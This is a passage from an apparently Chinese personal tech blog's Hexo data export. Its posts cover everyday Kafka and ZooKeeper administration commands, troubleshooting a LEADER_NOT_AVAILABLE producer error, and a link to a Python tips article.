Topic:T2\tPartitionCount:1\tReplicationFactor:1\tConfigs:\n\tTopic: T2\tPartition: 0\tLeader: 3\tReplicas: 3\tIsr: 3\n    Topic:T3\tPartitionCount:1\tReplicationFactor:1\tConfigs:\n\tTopic: T3\tPartition: 0\tLeader: 3\tReplicas: 3\tIsr: 3\n```","source":"_posts/kafka/kafka命令.md","raw":"---\ntitle: kafka命令\ndate: 2018-07-10 21:09:19\ntags: kafka\n---\n查看topic\n\n    kafka-topics.sh --list --zookeeper localhost:2181\n\n查看某一topic下的消息\n\n    kafka-console-consumer.sh --zookeeper localhost:2181 --topic account --from-beginning\n    \n删除topic\n```\n./zookeeper-shell.sh hs03:2181\n\nrmr /brokers/topics/{topic_name}\nrmr /admin/delete_topics/{topic_name}\n```\n创建消息\n\n    kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test\n    \n发送消息\n\n    kafka-console-producer.sh --broker-list hs03:9092 --topic hh\n    \n查看topic信息\n```\n    kafka-topics.sh --describe  --zookeeper hs03:2181\n    \n    Topic:T1\tPartitionCount:1\tReplicationFactor:1\tConfigs:\n\tTopic: T1\tPartition: 0\tLeader: 3\tReplicas: 3\tIsr: 3\n    Topic:T2\tPartitionCount:1\tReplicationFactor:1\tConfigs:\n\tTopic: T2\tPartition: 0\tLeader: 3\tReplicas: 3\tIsr: 3\n    Topic:T3\tPartitionCount:1\tReplicationFactor:1\tConfigs:\n\tTopic: T3\tPartition: 0\tLeader: 3\tReplicas: 3\tIsr: 3\n```","slug":"kafka/kafka命令","published":1,"updated":"2018-07-10T13:10:09.919Z","_id":"cjjedmhb0005q0gtjdk5do606","comments":1,"layout":"post","photos":[],"link":"","content":"<p>查看topic</p>\n<pre><code>kafka-topics.sh --list --zookeeper localhost:2181\n</code></pre><p>查看某一topic下的消息</p>\n<pre><code>kafka-console-consumer.sh --zookeeper localhost:2181 --topic account --from-beginning\n</code></pre><p>删除topic<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./zookeeper-shell.sh hs03:2181</span><br><span class=\"line\"></span><br><span class=\"line\">rmr /brokers/topics/&#123;topic_name&#125;</span><br><span class=\"line\">rmr /admin/delete_topics/&#123;topic_name&#125;</span><br></pre></td></tr></table></figure></p>\n<p>创建消息</p>\n<pre><code>kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test\n</code></pre><p>发送消息</p>\n<pre><code>kafka-console-producer.sh --broker-list hs03:9092 --topic hh\n</code></pre><p>查看topic信息<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   kafka-topics.sh --describe  --zookeeper hs03:2181</span><br><span class=\"line\">   </span><br><span class=\"line\">   Topic:T1\tPartitionCount:1\tReplicationFactor:1\tConfigs:</span><br><span class=\"line\">Topic: T1\tPartition: 0\tLeader: 3\tReplicas: 3\tIsr: 3</span><br><span class=\"line\">   Topic:T2\tPartitionCount:1\tReplicationFactor:1\tConfigs:</span><br><span class=\"line\">Topic: T2\tPartition: 0\tLeader: 3\tReplicas: 3\tIsr: 3</span><br><span class=\"line\">   Topic:T3\tPartitionCount:1\tReplicationFactor:1\tConfigs:</span><br><span class=\"line\">Topic: T3\tPartition: 0\tLeader: 3\tReplicas: 3\tIsr: 3</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>查看topic</p>\n<pre><code>kafka-topics.sh --list --zookeeper localhost:2181\n</code></pre><p>查看某一topic下的消息</p>\n<pre><code>kafka-console-consumer.sh --zookeeper localhost:2181 --topic account --from-beginning\n</code></pre><p>删除topic<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./zookeeper-shell.sh hs03:2181</span><br><span class=\"line\"></span><br><span class=\"line\">rmr /brokers/topics/&#123;topic_name&#125;</span><br><span class=\"line\">rmr /admin/delete_topics/&#123;topic_name&#125;</span><br></pre></td></tr></table></figure></p>\n<p>创建消息</p>\n<pre><code>kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test\n</code></pre><p>发送消息</p>\n<pre><code>kafka-console-producer.sh --broker-list hs03:9092 --topic hh\n</code></pre><p>查看topic信息<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   kafka-topics.sh --describe  --zookeeper hs03:2181</span><br><span class=\"line\">   </span><br><span class=\"line\">   Topic:T1\tPartitionCount:1\tReplicationFactor:1\tConfigs:</span><br><span class=\"line\">Topic: T1\tPartition: 0\tLeader: 3\tReplicas: 3\tIsr: 3</span><br><span class=\"line\">   Topic:T2\tPartitionCount:1\tReplicationFactor:1\tConfigs:</span><br><span class=\"line\">Topic: T2\tPartition: 0\tLeader: 3\tReplicas: 3\tIsr: 3</span><br><span class=\"line\">   Topic:T3\tPartitionCount:1\tReplicationFactor:1\tConfigs:</span><br><span class=\"line\">Topic: T3\tPartition: 0\tLeader: 3\tReplicas: 3\tIsr: 3</span><br></pre></td></tr></table></figure></p>\n"},{"title":"kafka发布消息报错LEADER_NOT_AVAILABLE","date":"2018-07-10T13:09:19.000Z","_content":"- #### 报错信息\n\n```\n$ bin/kafka-console-producer.sh --broker-list=\"192.168.1.100:32785\" --topic test\nssss\n[2016-05-11 11:21:42,527] WARN Error while fetching metadata with correlation id 0 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:42,625] WARN Error while fetching metadata with correlation id 1 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:42,727] WARN Error while fetching metadata with correlation id 2 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:42,829] WARN Error while fetching metadata with correlation id 3 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:42,931] WARN Error while fetching metadata with correlation id 4 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,033] WARN Error while fetching metadata with correlation id 5 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,135] WARN Error while fetching metadata with correlation id 6 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,237] WARN Error while fetching metadata with correlation id 7 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,339] WARN Error while fetching metadata with correlation id 8 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,441] WARN Error while fetching metadata with correlation id 9 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,543] WARN Error while fetching metadata with correlation id 10 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,645] WARN Error while fetching metadata with correlation id 11 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,747] WARN Error while fetching metadata with correlation id 12 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,849] WARN Error while fetching metadata with correlation id 13 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,951] WARN Error while fetching metadata with correlation id 14 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:44,053] WARN Error while fetching metadata with correlation id 15 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:44,155] WARN Error while fetching metadata with correlation id 16 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:44,257] WARN Error while fetching metadata with correlation id 17 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:44,359] WARN Error while fetching metadata with correlation \n```\n\n- #### 1.修改server.properties\n```\nvim config/server.properties \n#注释打开并把值修改成hsot\n\n# Hostname the broker will advertise to producers and consumers. If not set, it uses the\n# value for \"host.name\" if configured.  Otherwise, it will use the value returned from\n# java.net.InetAddress.getCanonicalHostName().\nadvertised.host.name=hs03\n```\n- #### 2.查看集群是否有broker没有运行\n```\n#进入zookeeper客户端\nzookeeper-shell.sh hs01:2181,hs02:2181,hs03:2181\n#查看状态\nls /brokers/ids\n[3, 2, 0]\n```\n如果少broker重新启动\n","source":"_posts/kafka/kafka发布消息报错LEADER_NOT_AVAILABLE.md","raw":"---\ntitle: kafka发布消息报错LEADER_NOT_AVAILABLE\ndate: 2018-07-10 21:09:19\ntags: kafka\n---\n- #### 报错信息\n\n```\n$ bin/kafka-console-producer.sh --broker-list=\"192.168.1.100:32785\" --topic test\nssss\n[2016-05-11 11:21:42,527] WARN Error while fetching metadata with correlation id 0 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:42,625] WARN Error while fetching metadata with correlation id 1 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:42,727] WARN Error while fetching metadata with correlation id 2 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:42,829] WARN Error while fetching metadata with correlation id 3 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:42,931] WARN Error while fetching metadata with correlation id 4 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,033] WARN Error while fetching metadata with correlation id 5 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,135] WARN Error while fetching metadata with correlation id 6 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,237] WARN Error while fetching metadata with correlation id 7 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,339] WARN Error while fetching metadata with correlation id 8 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,441] WARN Error while fetching metadata with correlation id 9 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,543] WARN Error while fetching metadata with correlation id 10 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,645] WARN Error while fetching metadata with correlation id 11 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,747] WARN Error while fetching metadata with correlation id 12 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,849] WARN Error while fetching metadata with correlation id 13 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:43,951] WARN Error while fetching metadata with correlation id 14 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:44,053] WARN Error while fetching metadata with correlation id 15 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:44,155] WARN Error while fetching metadata with correlation id 16 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:44,257] WARN Error while fetching metadata with correlation id 17 : {test=LEADER_NOT_AVAILABLE} (org.apache.kafka.clients.NetworkClient)\n[2016-05-11 11:21:44,359] WARN Error while fetching metadata with correlation \n```\n\n- #### 1.修改server.properties\n```\nvim config/server.properties \n#注释打开并把值修改成hsot\n\n# Hostname the broker will advertise to producers and consumers. If not set, it uses the\n# value for \"host.name\" if configured.  Otherwise, it will use the value returned from\n# java.net.InetAddress.getCanonicalHostName().\nadvertised.host.name=hs03\n```\n- #### 2.查看集群是否有broker没有运行\n```\n#进入zookeeper客户端\nzookeeper-shell.sh hs01:2181,hs02:2181,hs03:2181\n#查看状态\nls /brokers/ids\n[3, 2, 0]\n```\n如果少broker重新启动\n","slug":"kafka/kafka发布消息报错LEADER_NOT_AVAILABLE","published":1,"updated":"2018-07-10T13:10:09.918Z","_id":"cjjedmhb1005t0gtjxvoa4bks","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h4 id=\"报错信息\"><a href=\"#报错信息\" class=\"headerlink\" title=\"报错信息\"></a>报错信息</h4></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ bin/kafka-console-producer.sh --broker-list=&quot;192.168.1.100:32785&quot; --topic test</span><br><span class=\"line\">ssss</span><br><span class=\"line\">[2016-05-11 11:21:42,527] WARN Error while fetching metadata with correlation id 0 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:42,625] WARN Error while fetching metadata with correlation id 1 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:42,727] WARN Error while fetching metadata with correlation id 2 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:42,829] WARN Error while fetching metadata with correlation id 3 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:42,931] WARN Error while fetching metadata with correlation id 4 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,033] WARN Error while fetching metadata with correlation id 5 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,135] WARN Error while fetching metadata with correlation id 6 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,237] WARN Error while fetching metadata with correlation id 7 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,339] WARN Error while fetching metadata with correlation id 8 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,441] WARN Error while fetching metadata with correlation id 9 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,543] WARN Error while fetching metadata with correlation id 10 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,645] WARN Error while fetching metadata with correlation id 11 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,747] WARN Error while fetching metadata with correlation id 12 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,849] WARN Error while fetching metadata with correlation id 13 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,951] WARN Error while fetching metadata with correlation id 14 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:44,053] WARN Error while fetching metadata with correlation id 15 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:44,155] WARN Error while fetching metadata with correlation id 16 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:44,257] WARN Error while fetching metadata with correlation id 17 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:44,359] WARN Error while fetching metadata with correlation</span><br></pre></td></tr></table></figure>\n<ul>\n<li><h4 id=\"1-修改server-properties\"><a href=\"#1-修改server-properties\" class=\"headerlink\" title=\"1.修改server.properties\"></a>1.修改server.properties</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim config/server.properties </span><br><span class=\"line\">#注释打开并把值修改成hsot</span><br><span class=\"line\"></span><br><span class=\"line\"># Hostname the broker will advertise to producers and consumers. If not set, it uses the</span><br><span class=\"line\"># value for &quot;host.name&quot; if configured.  Otherwise, it will use the value returned from</span><br><span class=\"line\"># java.net.InetAddress.getCanonicalHostName().</span><br><span class=\"line\">advertised.host.name=hs03</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"2-查看集群是否有broker没有运行\"><a href=\"#2-查看集群是否有broker没有运行\" class=\"headerlink\" title=\"2.查看集群是否有broker没有运行\"></a>2.查看集群是否有broker没有运行</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#进入zookeeper客户端</span><br><span class=\"line\">zookeeper-shell.sh hs01:2181,hs02:2181,hs03:2181</span><br><span class=\"line\">#查看状态</span><br><span class=\"line\">ls /brokers/ids</span><br><span class=\"line\">[3, 2, 0]</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>如果少broker重新启动</p>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h4 id=\"报错信息\"><a href=\"#报错信息\" class=\"headerlink\" title=\"报错信息\"></a>报错信息</h4></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ bin/kafka-console-producer.sh --broker-list=&quot;192.168.1.100:32785&quot; --topic test</span><br><span class=\"line\">ssss</span><br><span class=\"line\">[2016-05-11 11:21:42,527] WARN Error while fetching metadata with correlation id 0 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:42,625] WARN Error while fetching metadata with correlation id 1 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:42,727] WARN Error while fetching metadata with correlation id 2 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:42,829] WARN Error while fetching metadata with correlation id 3 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:42,931] WARN Error while fetching metadata with correlation id 4 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,033] WARN Error while fetching metadata with correlation id 5 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,135] WARN Error while fetching metadata with correlation id 6 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,237] WARN Error while fetching metadata with correlation id 7 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,339] WARN Error while fetching metadata with correlation id 8 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,441] WARN Error while fetching metadata with correlation id 9 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,543] WARN Error while fetching metadata with correlation id 10 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,645] WARN Error while fetching metadata with correlation id 11 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,747] WARN Error while fetching metadata with correlation id 12 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,849] WARN Error while fetching metadata with correlation id 13 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:43,951] WARN Error while fetching metadata with correlation id 14 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:44,053] WARN Error while fetching metadata with correlation id 15 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:44,155] WARN Error while fetching metadata with correlation id 16 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:44,257] WARN Error while fetching metadata with correlation id 17 : &#123;test=LEADER_NOT_AVAILABLE&#125; (org.apache.kafka.clients.NetworkClient)</span><br><span class=\"line\">[2016-05-11 11:21:44,359] WARN Error while fetching metadata with correlation</span><br></pre></td></tr></table></figure>\n<ul>\n<li><h4 id=\"1-修改server-properties\"><a href=\"#1-修改server-properties\" class=\"headerlink\" title=\"1.修改server.properties\"></a>1.修改server.properties</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim config/server.properties </span><br><span class=\"line\">#注释打开并把值修改成hsot</span><br><span class=\"line\"></span><br><span class=\"line\"># Hostname the broker will advertise to producers and consumers. If not set, it uses the</span><br><span class=\"line\"># value for &quot;host.name&quot; if configured.  Otherwise, it will use the value returned from</span><br><span class=\"line\"># java.net.InetAddress.getCanonicalHostName().</span><br><span class=\"line\">advertised.host.name=hs03</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"2-查看集群是否有broker没有运行\"><a href=\"#2-查看集群是否有broker没有运行\" class=\"headerlink\" title=\"2.查看集群是否有broker没有运行\"></a>2.查看集群是否有broker没有运行</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#进入zookeeper客户端</span><br><span class=\"line\">zookeeper-shell.sh hs01:2181,hs02:2181,hs03:2181</span><br><span class=\"line\">#查看状态</span><br><span class=\"line\">ls /brokers/ids</span><br><span class=\"line\">[3, 2, 0]</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>如果少broker重新启动</p>\n"},{"title":"Articles","date":"2018-07-10T13:09:19.000Z","_content":"[编写更好Python程序的5个技巧](http://geek.csdn.net/news/detail/238940)","source":"_posts/python/Articles.md","raw":"---\ntitle: Articles\ndate: 2018-07-10 21:09:19\ntags: python\n---\n[编写更好Python程序的5个技巧](http://geek.csdn.net/news/detail/238940)","slug":"python/Articles","published":1,"updated":"2018-07-10T13:10:09.952Z","_id":"cjjedmhb2005v0gtjg76kn9b7","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://geek.csdn.net/news/detail/238940\" target=\"_blank\" rel=\"noopener\">编写更好Python程序的5个技巧</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://geek.csdn.net/news/detail/238940\" target=\"_blank\" rel=\"noopener\">编写更好Python程序的5个技巧</a></p>\n"},{"title":"zookeeper客户端查看kafka配置","date":"2018-07-10T13:09:19.000Z","_content":"- #### 连接\n```\n#连接\nzookeeper-shell.sh hs01:2181,hs02:2181,hs03:2181\n\nConnecting to hs01:2181,hs02:2181,hs03:2181\nWelcome to ZooKeeper!\nJLine support is disabled\n\nWATCHER::\n\nWatchedEvent state:SyncConnected type:None path:null\n\n```\n- #### 命令\n```\n    connect host:port\n\tget path [watch]\n\tls path [watch]\n\tset path data [version]\n\trmr path\n\tdelquota [-n|-b] path\n\tquit \n\tprintwatches on|off\n\tcreate [-s] [-e] path data acl\n\tstat path [watch]\n\tclose \n\tls2 path [watch]\n\thistory \n\tlistquota path\n\tsetAcl path acl\n\tgetAcl path\n\tsync path\n\tredo cmdno\n\taddauth scheme auth\n\tdelete path [version]\n\tsetquota -n|-b val path\n```\n- #### ls [path]\n```\nls /\n[hs_jstorm, consumers, hive_zookeeper_namespace_hive, latest_producer_id_block, rmstore, yarn-leader-election, controller_epoch, isr_change_notification, admin, zookeeper, cluster, config, controller, brokers]\n\n#查看broker的id\nls /brokers/ids\n[3, 2, 0]\n\n#查看消息\nls /brokers/topics\n[new, __consumer_offsets, test, uf20, hahahhaahh, testfile, accountPosition, testFile]\n\n#查看删除的消息\nls /admin/delete_topics\n[account]\n```\n- #### get [path]\n```\n#查看broker的信息\nget /brokers/ids/0\n{\"jmx_port\":-1,\"timestamp\":\"1516184048700\",\"endpoints\":[\"PLAINTEXT://hs01:9092\"],\"host\":\"hs01\",\"version\":2,\"port\":9092}\ncZxid = 0x29000048b2\nctime = Wed Jan 17 18:14:08 CST 2018\nmZxid = 0x29000048b2\nmtime = Wed Jan 17 18:14:08 CST 2018\npZxid = 0x29000048b2\ncversion = 0\ndataVersion = 0\naclVersion = 0\nephemeralOwner = 0x261033b8886032a\ndataLength = 119\nnumChildren = 0\n```\n- #### rmr [path]\n```\n#删除消息\nrmr /brokers/topics/test\nrmr /admin/delete_topics/test\n```","source":"_posts/kafka/zookeeper客户端查看kafka配置.md","raw":"---\ntitle: zookeeper客户端查看kafka配置\ndate: 2018-07-10 21:09:19\ntags: kafka\n---\n- #### 连接\n```\n#连接\nzookeeper-shell.sh hs01:2181,hs02:2181,hs03:2181\n\nConnecting to hs01:2181,hs02:2181,hs03:2181\nWelcome to ZooKeeper!\nJLine support is disabled\n\nWATCHER::\n\nWatchedEvent state:SyncConnected type:None path:null\n\n```\n- #### 命令\n```\n    connect host:port\n\tget path [watch]\n\tls path [watch]\n\tset path data [version]\n\trmr path\n\tdelquota [-n|-b] path\n\tquit \n\tprintwatches on|off\n\tcreate [-s] [-e] path data acl\n\tstat path [watch]\n\tclose \n\tls2 path [watch]\n\thistory \n\tlistquota path\n\tsetAcl path acl\n\tgetAcl path\n\tsync path\n\tredo cmdno\n\taddauth scheme auth\n\tdelete path [version]\n\tsetquota -n|-b val path\n```\n- #### ls [path]\n```\nls /\n[hs_jstorm, consumers, hive_zookeeper_namespace_hive, latest_producer_id_block, 